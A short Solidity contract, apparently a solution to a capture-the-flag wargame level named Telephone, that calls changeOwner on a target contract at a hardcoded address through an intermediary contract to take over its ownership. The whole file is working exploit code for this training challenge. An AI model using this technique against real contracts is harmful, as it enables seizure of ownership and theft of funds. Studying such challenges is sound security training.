// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
import './Telephone.sol';

contract TelephoneHack {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    Telephone public telephone =
        Telephone(0xb84b4e75189f027dA8A586de4deBbEd1D87a37FD);

    function changeTelephoneOwner(address _address) public {
        telephone.changeOwner(_address);
    }
}
